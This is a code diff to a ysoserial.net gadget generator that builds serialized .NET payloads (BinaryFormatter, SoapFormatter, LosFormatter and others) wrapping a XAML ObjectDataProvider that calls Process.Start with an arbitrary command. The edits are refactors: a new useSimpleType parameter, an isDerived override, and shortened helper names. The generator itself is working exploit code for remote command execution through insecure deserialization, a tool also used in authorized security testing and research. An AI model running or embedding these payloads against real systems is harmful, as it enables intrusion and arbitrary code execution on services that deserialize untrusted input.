@@ -2,6 +2,7 @@
 using System.Runtime.Serialization;
 using System.Management.Automation;
 using System.Collections.Generic;
+using ysoserial.Helpers;
 
 namespace ysoserial.Generators
 {
@@ -43,15 +44,20 @@ namespace ysoserial.Generators
             return "Oleksandr Mirosh and Alvaro Munoz";
         }
 
+        public override bool isDerived()
+        {
+            return true;
+        }
+
         public override List<string> SupportedFormatters()
         {
             return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
         }
 
-        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify)
+        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify, Boolean useSimpleType)
         {
             Boolean hasArgs;
-            string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);
+            string[] splittedCMD = CommandArgSplitter.SplitCommand(cmd, CommandArgSplitter.CommandType.XML, out hasArgs);
 
             String cmdPart;
 
@@ -93,7 +99,7 @@ namespace ysoserial.Generators
   xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
   xmlns:System=""clr-namespace:System;assembly=mscorlib""
   xmlns:Diag=""clr-namespace:System.Diagnostics;assembly=system""&gt;
-	 &lt;ObjectDataProvider x:Key=""LaunchCalc"" ObjectType = ""{ x:Type Diag:Process}"" MethodName = ""Start"" &gt;
+	 &lt;ObjectDataProvider x:Key="""" ObjectType = ""{ x:Type Diag:Process}"" MethodName = ""Start"" &gt;
      &lt;ObjectDataProvider.MethodParameters&gt;
         "+ cmdPart + @"
      &lt;/ObjectDataProvider.MethodParameters&gt;
@@ -133,11 +139,11 @@ namespace ysoserial.Generators
             {
                 // Could not be tested so it may not work here!
                 // also not sure if can use CDATA otherwise we could use the CDATA flag to save more space
-                clixml = Helpers.XMLMinifier.Minify(clixml, null, null);
+                clixml = XMLMinifier.Minify(clixml, null, null);
             }
 
             PsObjectMarshal payload = new PsObjectMarshal(clixml);
-            return Serialize(payload, formatter, test, minify);
+            return Serialize(payload, formatter, test, minify, useSimpleType);
         }
 
     }
